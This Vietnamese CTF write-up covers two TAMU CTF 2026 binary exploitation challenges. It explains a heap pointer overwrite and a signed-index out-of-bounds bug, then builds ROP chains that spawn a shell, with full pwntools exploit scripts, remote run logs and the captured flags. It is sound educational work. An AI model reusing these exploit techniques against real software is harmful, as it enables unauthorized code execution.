+++
title = 'TAMU CTF 2026'
date = 2026-03-23T15:40:29+07:00
draft = false
categories = ["ctf"]
+++

## Task Manager

![alt text](<image.png>)

### 1. Phân tích Binary

#### Tổng quan

Binary là một task manager đơn giản với menu:

| Option | Chức năng |
|--------|-----------|
| 1 | Add task |
| 2 | Print task |
| 3 | Delete last task |
| 4 | Add reminder |
| 5 | Exit |

#### Cấu trúc Heap

Mỗi khi gọi "Add task", chương trình cấp phát một chunk:

```js
malloc(0x58)  →  chunk thực tế = 0x60 bytes (do alignment)
```

Layout của mỗi chunk:

```js
+0x00  [data - 0x50 bytes]   ← user input
+0x50  [next pointer]        ← trỏ đến task tiếp theo (linked list)
```

Các task được tổ chức thành **singly linked list** (danh sách liên kết đơn), mỗi node giữ một con trỏ `next` trỏ đến node tiếp theo.


### 2. Các Lỗ Hổng

#### Bug 1 — Heap Overflow (Off-by-one / Overwrite Pointer)

```c
read(0, v7, 0x58u);   // đọc tối đa 0x58 bytes vào buffer
```

**Vấn đề:**
- Buffer cho data là `0x50` bytes (`+0x00` đến `+0x4F`)
- Nhưng `read()` cho phép nhập tới `0x58` bytes

→ Ta có thể ghi **8 bytes thừa** ra ngoài phần data, chính xác vào vị trí `+0x50` — tức là **ghi đè con trỏ `next`**.

**Hậu quả:** Khi chương trình duyệt linked list, nó sẽ follow con trỏ `next` bị giả mạo → trỏ đến địa chỉ tùy ý.

#### Bug 2 — Arbitrary Read (Đọc bộ nhớ tùy ý)

```c
printf("Task you entered: %s\n", v7);
```

`printf` với `%s` sẽ in nội dung tại địa chỉ `v7` cho đến khi gặp null byte `\x00`.

**Khai thác:**
1. Ghi đè `next` pointer → trỏ đến địa chỉ ta muốn đọc
2. Gọi "Print task" → chương trình follow pointer → in nội dung vùng nhớ đó ra

→ Leak được: **heap address**, **stack address**, **PIE base**, **libc base**.

#### Bug 3 — Arbitrary Write (Ghi bộ nhớ tùy ý)

Vì ta kiểm soát được con trỏ `next`, khi "Add task" được gọi tiếp theo, `read()` sẽ ghi dữ liệu vào vùng nhớ mà con trỏ đó trỏ tới.

→ Primitive **write-what-where**: ghi bất kỳ giá trị nào vào địa chỉ bất kỳ.

#### Bug 4 — Exit Free Loop (Case 5)

```c
while (size)
{
    v17 = *v16;
    for (m = 1; m < size; ++m)
        v17 = v17->next;   // duyệt theo linked list

    free(v17->next);       // free node cuối
}
```

**Vấn đề:**
- Vòng lặp free duyệt list theo con trỏ `next`
- Nếu ta đã ghi đè `next` → ta kiểm soát địa chỉ bị `free()`

Nếu ta đặt ROP chain trên stack rồi exit → vòng này sẽ `free()` vùng stack chứa ROP → **crash**.

**Giải pháp:** Làm cho `size = -1` (= `0xFFFFFFFFFFFFFFFF`) → bypass toàn bộ free loop.

### 3. Chuỗi Khai Thác (Exploit Chain)

#### Bước 1 — Leak Heap Address

```python
add_task('A' * 0x50)
ru('A' * 0x50)               # đọc output, bỏ qua phần 'A'
heap_base = leak - 0x360     # tính heap base từ địa chỉ bị leak
```

**Cơ chế:** `%s` in nội dung chunk cho đến null byte → in luôn cả con trỏ `next` → lấy được heap address.

#### Bước 2 — Leak Stack Address

```python
add_task(b'B' * 0x50 + p64(heap_base + 0x2a0))   # ghi đè next → trỏ vào heap chứa stack pointer
add_task(b'B' * 0x8)                               # follow pointer → đọc stack address
```

**Cơ chế:** Tại `heap_base + 0x2a0` (vùng remider) có lưu một con trỏ trỏ vào stack (do chương trình lưu stack frame). Redirect `next` đến đó → đọc được stack address.

#### Bước 3 — Leak PIE Base

```python
stack_pie = stack_leak + 0xb8    # offset đến return address chứa PIE
```

Trên stack tại offset `+0xb8` là **return address** của một hàm trong binary → tính ngược ra PIE base.

#### Bước 4 — Leak Libc Base

```python
stack_libc = stack_leak + 0xa8   # offset đến return address libc
```

Tại `+0xa8` là return address về libc → tính libc base.

#### Bước 5 — Xây dựng ROP Chain

```python
rop_stack = stack_leak + 0xb0    # địa chỉ trên stack để đặt ROP

payload = flat(
    pop_rdi,        # gadget: pop rdi; ret
    bin_sh,         # địa chỉ chuỗi "/bin/sh" trong libc
    ret,            # gadget: ret (stack alignment)
    system          # địa chỉ hàm system() trong libc
)
```

Chuỗi ROP này sẽ gọi `system("/bin/sh")` → shell.

#### Bước 6 — Ghi ROP lên Stack (Overwrite Return Address)

```python
add_task(b'E' * 0x50 + p64(rop_stack))   # ghi đè next → trỏ đến vị trí return address trên stack
add_task(payload)                          # ghi ROP chain vào đó
```

Lúc này return address của hàm main đã bị ghi đè bằng ROP chain.

#### Bước 7 — Bypass Free Loop (Sửa `size = -1`)

Nếu thoát bình thường, case 5 sẽ gọi `free()` lên vùng stack chứa ROP → crash trước khi `ret`.

**Giải pháp:** Ghi đè biến `size` thành `-1`:

```python
size_addr = pie_base + 0x4050     # địa chỉ biến size trong BSS/data segment

add_task(b'F' * 0x50 + p64(size_addr))    # ghi đè next → trỏ đến &size
add_task(p64(0xffffffffffffffff))          # ghi -1 vào size
```

Khi đó:

```c
while (size)    // size = -1 = 0xFFFF... → vẫn true
{
    for (m = 1; m < size; ++m)    // m < -1 (unsigned) → loop không free được gì có hại
```

Với `size = -1`, vòng `for` không thể hoàn thành → flow tiếp tục đến `ret` an toàn.

#### Bước 8 — Trigger Shell

```python
trigger()    # gọi exit / return từ main
```

Chương trình `ret` → nhảy vào ROP chain → `system("/bin/sh")` → **shell!**

### 4. Full Exploit Script

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('task-manager_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+403
        # b*main+737
        
    """)

if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

def add_task(task):
    slna('input: ', 1)
    sa('80 characters): ', task)

def print_tasks():
    slna('input: ', 2)

def delete_last_task():
    slna('input: ', 3)

def add_reminder(reminder):
    slna('input: ', 4)
    sla('72 characters): ', reminder)

def trigger():
    slna('input: ', 5)

### Exploit goes here ###
# Heap leak
sla('40 characters): ', 'Duc')
add_task('A' * 0x50)
ru('A' * 0x50)
heap_base = u64(r(6).ljust(8, b'\x00')) - 0x360
info(f'Heap base: {hex(heap_base)}')

# Stack leak
add_task(b'B' * 0x50 + p64(heap_base + 0x2a0))
add_task('B' * 0x8)
ru('B' * 0x8)
stack_leak = u64(r(6).ljust(8, b'\x00'))
info(f'Stack leak: {hex(stack_leak)}')

# PIE leak
stack_pie = stack_leak + 0xb8
info(f'PIE stack address: {hex(stack_pie)}')
add_task(b'C' * 0x50 + p64(stack_pie))
add_task('C' * 0x8)
ru('C' * 0x8)
pie_address = u64(r(6).ljust(8, b'\x00')) - 0x1231
info(f'PIE base: {hex(pie_address)}')

# Libc leak
stack_libc = stack_leak + 0xa8
info(f'Libc stack address: {hex(stack_libc)}')
add_task(b'D' * 0x50 + p64(stack_libc))
add_task('D' * 0x8)
ru('D' * 0x8)
libc.address = u64(r(6).ljust(8, b'\x00')) - 0x2724a
info(f'Heap base: {hex(heap_base)}')
info(f'Stack leak: {hex(stack_leak)}')
info(f'PIE base: {hex(pie_address)}')
info(f'Libc base: {hex(libc.address)}')

# ROP chain
rop_stack = stack_leak + 0xb0
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload = p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

add_task(b'E' * 0x50 + p64(rop_stack))
add_task(payload)

# Overwrite size = 0
size = pie_address + 0x4050
info(f'size address: {hex(size)}')

add_task(b'F' * 0x50 + p64(size))
add_task(p64(0xffffffffffffffff))

# Trigger 
trigger()
sl('ls')
sl('cat flag.txt')

p.interactive()
```

```bash
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/CTF/2026/TamuCTF/task-manager  ./exploit.py REMOTE      
[+] Opening connection to streams.tamuctf.com on port 443: Done
/home/lwd3c/Desktop/CTF/2026/TamuCTF/task-manager/./exploit.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
/home/lwd3c/miniconda3/envs/pwn/lib/python3.12/site-packages/pwnlib/tubes/tube.py:932: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/lwd3c/Desktop/CTF/2026/TamuCTF/task-manager/./exploit.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
/home/lwd3c/miniconda3/envs/pwn/lib/python3.12/site-packages/pwnlib/tubes/tube.py:922: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/lwd3c/Desktop/CTF/2026/TamuCTF/task-manager/./exploit.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
[*] Heap base: 0x55a5ba470000
[*] Stack leak: 0x7ffedf98c9f8
[*] PIE stack address: 0x7ffedf98cab0
[*] PIE base: 0x55a591f84000
[*] Libc stack address: 0x7ffedf98caa0
[*] Heap base: 0x55a5ba470000
[*] Stack leak: 0x7ffedf98c9f8
[*] PIE base: 0x55a591f84000
[*] Libc base: 0x7fba30a66000
[*] Loaded 197 cached gadgets for 'libc.so.6'
[*] size address: 0x55a591f88050
/home/lwd3c/Desktop/CTF/2026/TamuCTF/task-manager/./exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
[*] Switching to interactive mode
You selected: 5

Exiting.....
docker_entrypoint.sh
flag.txt
task-manager
gigem{f4s7b1N5_0f_5p141t_hAuN7_8s_d1A593c6CeF}
$  
```

`FLAG: gigem{f4s7b1N5_0f_5p141t_hAuN7_8s_d1A593c6CeF}`

#### Sơ đồ Exploit Chain

```bash
Heap Overflow (off-by-one)
        │
        ▼
  Ghi đè next pointer
        │
        ├──► Arbitrary Read → Leak heap / stack / PIE / libc
        │
        └──► Arbitrary Write → Ghi ROP chain lên stack
                                        │
                              Bypass free loop (size = -1)
                                        │
                                   Trigger ret
                                        │
                               system("/bin/sh") ✓
```
---

## Goodbye libc

![alt text](<image-1.png>)

### 1. Phân tích Binary

#### Tổng quan

Binary `goodbye-libc` là một chương trình tương tác đơn giản, nhưng chạy trên một **Custom Libc** (`libc.so.6` / `libbye-libc.so`) cực kỳ tối giản.

Chương trình cho phép người dùng thao tác với một mảng số nguyên `v39` nằm trên Stack thông qua menu:

| Option | Chức năng |
|--------|-----------|
| 1 | Write Number (ghi số vào mảng) |
| 6 | Print Number (in số từ mảng) |
| ... | Các option khác |

#### Môi trường 

Đây là điểm khiến bài này khó hơn bình thường:

| Rào cản | Chi tiết |
|---------|----------|
| **Custom Libc tối giản** | Chỉ có **41 gadgets**, không có `system()`, không có chuỗi `/bin/sh` |
| **Thiếu gadget quan trọng** | Không có `pop rdx`, không có gadget điều khiển `RAX` tự do |
| **Không gian ghi hạn chế** | Chỉ có **4 slots** (ô nhớ) trên mảng `v39` để ghi dữ liệu |
| **Mục tiêu** | Vượt qua tất cả rào cản → `execve("/bin/sh", 0, 0)` → Shell |

#### Cấu trúc Stack

```bash
Stack của hàm _start:
+0x00  [v39[0]]   ← slot đầu tiên (index 1)
+0x08  [v39[1]]   ← slot thứ hai  (index 2)
+0x10  [v39[2]]   ← slot thứ ba   (index 3)
...
-0x08  [v39[-1]]  ← Return Address của write_num  ← NGUY HIỂM
-0x10  [v39[-2]]  ← Return Address về _start      ← dùng để leak PIE
```

### 2. Các Lỗ Hổng

#### Bug 1 — Integer Underflow / Out-of-Bounds (OOB)

Đoạn code kiểm tra index có dạng:

```c
int input_index;  // signed 32-bit integer

if (input_index <= 3) {
    return input_index - 1;  // index thực tế: 0, 1, 2
}
```

**Vấn đề:** Biến `input_index` là số **có dấu (signed)**. Nếu ta truyền số âm, điều kiện vẫn đúng:

```bash
input_index = -1  →  -1 <= 3  ✓  →  return -1 - 1 = -2
input_index =  0  →   0 <= 3  ✓  →  return  0 - 1 = -1
```

**Trick nhập số âm:** Nhập `4294967295` (= `0xFFFFFFFF`) — khi cast sang `int32`, nó trở thành `-1`.

| Giá trị nhập | Được hiểu là | Index thực tế | Truy cập ô nhớ |
|--------------|--------------|---------------|----------------|
| `1` | 1 | 0 | `v39[0]` |
| `4294967295` | -1 | -2 | `v39[-2]` |
| `0` | 0 | -1 | `v39[-1]` |

→ Ta có thể **đọc/ghi Stack ngoài ranh giới mảng** `v39`.

#### Bug 2 — Stack Aliasing (Trùng lặp bộ nhớ)

Đây là lỗ hổng nguy hiểm nhất của bài.

**Phát hiện qua GDB:** Khi hàm `_start` gọi `write_num(index, value)`, một stack frame mới được tạo ra. Sau khi đo offset:

```bash
Địa chỉ của v39[-1]  ==  Return Address của write_num
```

Hai ô nhớ này **trùng nhau hoàn toàn** (stack aliasing).

**Hậu quả:**

```python
write_num(0, gadget_address)
# ↑ Hàm này vừa tự ghi đè Return Address của chính nó!
# Ngay khi lệnh `ret` thực thi → nhảy thẳng vào gadget_address
```

#### Bug 3 — Không gian ROP quá nhỏ (4 Slots)

Chỉ có 4 ô nhớ hợp lệ (`v39[0]` đến `v39[2]` và một số ô âm), không đủ để chứa một ROP chain hoàn chỉnh để lấy shell.

→ Cần dùng kỹ thuật **"Massive Read"**: thiết lập một lệnh `read(0, buf, 500)` để mở ra không gian nhập liệu 500 bytes, rồi gửi ROP chain thật sự qua đó.

### 3. Chuỗi Khai Thác (Exploit Chain)

Toàn bộ exploit được chia thành **4 giai đoạn**.

#### Giai đoạn 1 — Leak PIE Base

**Mục tiêu:** Tính địa chỉ thật của binary (vì PIE enabled → địa chỉ thay đổi mỗi lần chạy).

**Cơ chế:**

Tại `v39[-2]` (nhập index `4294967295`) có chứa một **Return Address** trỏ vào vùng code của binary. Ta dùng chức năng Print để đọc nó ra:

```python
slna('input: ', 6)              # Chọn option Print
slna('[1-3]: ', 4294967295)     # Truy cập v39[-2]
ru('written: ')
leak = int(rl().strip())
exe.address = leak - 0x1cbd     # Trừ offset tĩnh → PIE base
```

**Kết quả:** Biết `PIE Base` → tính được mọi địa chỉ trong binary.

#### Giai đoạn 2 — Leak Libc Base qua "Magic Gadget"

**Vấn đề:** Để tính địa chỉ Libc, ta cần in ra `read@got`. Muốn gọi `write(1, read@got, 8)` cần setup 3 thanh ghi: `RDI=1`, `RSI=read@got`, `RDX=8`. Nhưng không có gadget `pop rdx` trong Custom Libc!

**Giải pháp: Magic Gadget**

Bên trong code binary có một đoạn gadget đặc biệt:

```asm
0x...cd1: mov edx, ebx   ; RDX = EBX  (lấy giá trị từ EBX)
0x...cd3: mov rsi, rax   ; RSI = RAX  (lấy giá trị từ RAX)
0x...cd6: mov edi, 0x1   ; RDI = 1    (hardcoded = stdout)
0x...cdb: call write     ; write(1, RAX, EBX)
0x...ce0: jmp _start     ; quay về menu chính!
```

Gadget này tự lắp ráp các tham số từ `EBX` và `RAX` — ta chỉ cần chuẩn bị 2 thanh ghi đó trước khi nhảy vào.

**Cách nạp EBX = 8 (không có `pop rbx`):**

`EBX` là thanh ghi **callee-saved** — nó không bị xóa khi gọi hàm. Khi ta gọi `strlen` (ngầm trong hàm Print), kết quả độ dài chuỗi được lưu vào `EBX`.

```python
write_num(1, 10000000)      # Ghi số 10000000 (8 chữ số)
slna(b'input: ', 6)
slna(b'[1-3]: ', 1)         # Print v39[1]
ru(b'Value written: 10000000\n')
# strlen("10000000") = 8 → EBX = 8 ✓
```

**Cách nạp RAX = read@got:**

Hàm `input_num` đọc một số từ stdin và trả về nó qua `RAX` (quy ước calling convention: giá trị trả về luôn nằm trong `RAX`).

```python
# Nhảy vào input_num, gửi địa chỉ read@got
# → RAX = read@got ✓
```

**Kết hợp lại:**

```python
# 1. Set EBX = 8 qua strlen trick
write_num(1, 10000000)
# ... (print để trigger strlen)

# 2. Xếp stack để nhảy vào Magic Gadget
write_num(0, magic_gadget)      # v39[0] = magic_gadget
write_num(4294967295, input_num_addr)  # v39[-2] = input_num (kích nổ stack aliasing)
p.sendline(str(read_got).encode())     # Gửi read_got → RAX = read_got

# 3. Magic Gadget tự động gọi write(1, read_got, 8)
libc.address = u64(r(8)) - 0x1058
```

#### Giai đoạn 3 — Massive Read

**Vấn đề:** Chỉ có 4 slots → không thể ghi đủ ROP chain để lấy shell.

**Giải pháp:** Dùng 4 slots đó để thiết lập một lệnh `read(0, RSI, 500)`, cho phép nhập thêm **500 bytes** tùy ý vào stack.

**Setup trong 3 slots:**

```python
write_num(1, 500)               # v39[0] = 500       (giá trị RDX)
write_num(2, mov_rax_0_ret)     # v39[1] = &read     (địa chỉ hàm read)
```

Lúc này stack trông như:

```bash
v39[0] = 500             ← sẽ bị pop vào RDX
v39[1] = địa chỉ read   ← sẽ được gọi
```

**Kích hoạt bằng Stack Aliasing:**

```python
write_num(0, pop_rdx_ret)
# ↑ Ghi vào v39[-1] = Return Address của write_num
# Khi write_num ret → nhảy vào pop_rdx_ret
# → RDX = 500 (pop từ v39[0])
# → ret → nhảy vào read (lấy từ v39[1])
# → read(0, RSI, 500) — chờ nhận 500 bytes!
```

`RSI` lúc này đang trỏ vào vùng stack sâu hơn, an toàn để ghi ROP chain.

#### Giai đoạn 4 — Vùng nhớ `str`, ROP Chain 2 Tầng & Lấy Shell

**Vùng nhớ `str` — Bãi đáp cho `/bin/sh`**

Để gọi `execve("/bin/sh", 0, 0)`, ta **bắt buộc** phải có một con trỏ trỏ đến chuỗi `"/bin/sh"`. Vậy chuỗi này sẽ được đặt ở đâu?
 
| Lựa chọn | Vấn đề |
|----------|--------|
| Custom Libc | Không chứa chuỗi `/bin/sh` |
| Stack | Địa chỉ thay đổi liên tục do ASLR, rủi ro cao |
| `.bss` / vùng toàn cục | ✅ Địa chỉ tĩnh (cố định so với PIE base), có quyền `rw-p` |
 
**Phát hiện vùng `str` qua GDB:**
 
Khi debug chức năng Print Numbers (Option 6), ta quan sát thấy chương trình gọi hàm `long_to_str` để chuyển số thành chuỗi ký tự. Hàm này **luôn ghi kết quả vào một biến toàn cục** tên là `str` — hay còn gọi là `edata` trong script pwntools.
 
```
# Kiểm tra trong GDB:
vmmap
→ 0x...4000  rw-p   ← vùng .bss, đây chính là nơi biến `str` tồn tại
 
info symbol exe.address + 0x4000
→ str  (biến toàn cục)
```
 
**Kết luận:** `edata_addr = exe.address + 0x4000` là **"bãi đáp"** hoàn hảo:
- Địa chỉ tĩnh, tính được ngay sau khi có PIE base
- Có quyền đọc/ghi (`rw-p`)
- Không bị ghi đè bởi các bước khác trong exploit
 
Trong Giai đoạn 4, ta sẽ dùng lệnh `read` để ghi thẳng `/bin/sh\x00` vào vùng này, rồi trỏ `RDI` về đây khi gọi `execve`.

**Cấu trúc payload gửi qua Massive Read:**

```bash
[148 bytes padding]  ←  lấp đầy khoảng cách từ RSI đến Return Address
[ROP Chain Tầng 1]   ←  đọc "/bin/sh" + set RAX = 59
[ROP Chain Tầng 2]   ←  gọi execve syscall
```

**ROP Chain Tầng 1 — Ghi `/bin/sh` vào `str` và Set RAX = 59**

**Mục tiêu:** Ghi chuỗi `/bin/sh` vào vùng `str` (`edata`) và đặt `RAX = 59` (syscall number của `execve`).
 
Tầng này giải quyết **2 vấn đề cùng lúc** bằng một lệnh `read` duy nhất:

**Trick nạp RAX = 59 mà không có `mov rax, 59`:**

Hàm `read()` trả về **số byte thực tế đã đọc** qua `RAX`. Nếu ta gọi `read(0, edata, 59)` và gửi **đúng 59 bytes**, thì `RAX = 59` một cách tự nhiên!

```python
rop_tier1 = flat([
    pop_rdi_rsi_rdx,
    0,           # RDI = 0 (stdin)
    edata_addr,  # RSI = địa chỉ .bss (rw-p, an toàn để ghi)
    59,          # RDX = 59 (số byte đọc = syscall number execve)
    mov_rax_0_ret,  # gọi read(0, edata, 59)
    
    0xdeadbeef,  # Dummy payload
])
```

**Tại sao cần `0xdeadbeef` (Dummy Payload)?**

Bên trong hàm `read` của Custom Libc có một lệnh `pop rbp` ngay trước `ret`:

```asm
; Cuối hàm read trong Custom Libc:
pop rbp    ; ← lệnh này "nuốt" 8 bytes trên stack
ret        ; ← mới ret về ROP chain
```

Nếu không có dummy, lệnh `pop rbp` sẽ nuốt mất phần đầu của ROP Chain Tầng 2 → crash. 

**ROP Chain Tầng 2 — Thực thi `execve`**

Lúc này: `RAX = 59` và `/bin/sh\x00` đã nằm gọn trong vùng `str` tại `edata_addr`.

```python
rop_tier2 = flat([
    pop_rdi_rsi_rdx,
    edata_addr,  # RDI = trỏ đến "/bin/sh"
    0,           # RSI = NULL
    0,           # RDX = NULL
    syscall      # execve("/bin/sh", NULL, NULL) → SHELL!
])
```

**Gửi Payload**

```python
# Bước 1: Gửi ROP chain qua Massive Read
p.send(padding + rop_tier1 + rop_tier2)
 
# Bước 2: Gửi ĐÚNG 59 bytes:
#   - 8 bytes đầu: "/bin/sh\x00" được ghi vào vùng str
#   - 51 bytes còn lại: null padding
#   - read trả về 59 → RAX = 59 ✓
pause()
p.send(b'/bin/sh\x00'.ljust(59, b'\x00'))
# → RAX = 59 ✓, str = "/bin/sh\x00" ✓
# → Tầng 2 thực thi → shell!
```

### 4. Full Exploit Script

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('goodbye-libc_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*input_menu+62
        
    """)

if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="goodbye-libc")

else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !
def write_num(index, value):
    slna(b'input: ', 1)
    slna(b'[1-3]: ', index)
    slna(b'write: ', value)

# Leak PIE 
slna('input: ', 6)
slna('[1-3]: ', 4294967295)
ru('written: ')
exe.address = int(rl().strip()) - 0x1cbd
info(f'PIE base: {hex(exe.address)}')

write_gadget = exe.address + 0x114a
read_got = exe.got['read']
start_addr = exe.sym['_start']
input_num_addr = exe.sym['input_num']
info(f'write_gadget: {hex(write_gadget)}')
info(f'read@got: {hex(read_got)}')
info(f'start: {hex(start_addr)}')
info(f'input_num: {hex(input_num_addr)}')

# Leak Libc
magic_gadget = exe.address + 0x1CD1
info(f'magic_gadget: {hex(magic_gadget)}')
write_num(1, 10000000)
slna(b'input: ', 6)
slna(b'[1-3]: ', 1)
ru(b'Value written: 10000000\n')

write_num(0, magic_gadget)
write_num(4294967295, input_num_addr)
pause()
p.sendline(str(read_got).encode())

libc.address = u64(r(8)) - 0x1058
info(f'Libc base: {hex(libc.address)}')
info(f'PIE base: {hex(exe.address)}')

# ROP Chain
pop_rdx_ret     = libc.address + 0x1041 
pop_rdi_rsi_rdx = libc.address + 0x103f
syscall         = libc.address + 0x1039
mov_rax_0_ret   = libc.address + 0x105c  

edata_addr      = exe.address + 0x4000

write_num(1, 500)

write_num(2, mov_rax_0_ret)

write_num(0, pop_rdx_ret)

padding = b'A' * 148

rop_chain = flat([
    # Đọc "/bin/sh" vào edata và set RAX = 59
    pop_rdi_rsi_rdx,
    0,                  # RDI = 0 (stdin)
    edata_addr,         # RSI = edata (rw-p)
    59,                 # RDX = 59
    mov_rax_0_ret,      # Gọi read

    0xdeadbeef,         # Dummy cho `pop rbp` 

    # Thực thi execve
    pop_rdi_rsi_rdx,
    edata_addr,         # RDI = edata (đã chứa chuỗi /bin/sh)
    0,                  # RSI = 0
    0,                  # RDX = 0
    syscall             
])

p.send(padding + rop_chain)

pause()

p.send(b'/bin/sh\x00'.ljust(59, b'\x00'))

sl('ls')
sl('cat flag.txt') 

p.interactive()
```

```bash
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/CTF/2026/TamuCTF/goodbye-libc  ./exploit.py REMOTE 
[!] Did not find any GOT entries
[+] Opening connection to streams.tamuctf.com on port 443: Done
/home/lwd3c/miniconda3/envs/pwn/lib/python3.12/site-packages/pwnlib/tubes/tube.py:932: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/lwd3c/Desktop/CTF/2026/TamuCTF/goodbye-libc/./exploit.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
[*] PIE base: 0x55b76f459000
[*] write_gadget: 0x55b76f45a14a
[*] read@got: 0x55b76f45cfe8
[*] start: 0x55b76f45a54c
[*] input_num: 0x55b76f45a29e
[*] magic_gadget: 0x55b76f45acd1
[*] Paused (press any to continue)
[*] Libc base: 0x7f849d74c000
[*] PIE base: 0x55b76f459000
[*] Paused (press any to continue)
/home/lwd3c/Desktop/CTF/2026/TamuCTF/goodbye-libc/./exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
[*] Switching to interactive mode
docker_entrypoint.sh
flag.txt
goodbye-libc
libbye-libc.so
gigem{flamepyromancer_didnt_change_the_default_flag}
$  
```

`FLAG: gigem{flamepyromancer_didnt_change_the_default_flag}`

#### Sơ đồ Exploit Chain

```bash
Integer Underflow (OOB)
        │
        ▼
  Truy cập v39[-1], v39[-2]
        │
        ├──► Print v39[-2]  →  Leak PIE base
        │
        ├──► strlen trick   →  EBX = 8
        │    input_num trick →  RAX = read@got
        │    Magic Gadget   →  write(1, got, 8)  →  Leak Libc base
        │
        ├──► Stack Aliasing (v39[-1] = RIP)
        │    pop_rdx + read →  Massive Read (500 bytes)
        │
        └──► ROP Chain 2 Tầng:
             Tầng 1: read(0, bss, 59) + /bin/sh  →  RAX = 59
             Tầng 2: syscall  →  execve("/bin/sh", 0, 0)  →  SHELL ✓
```
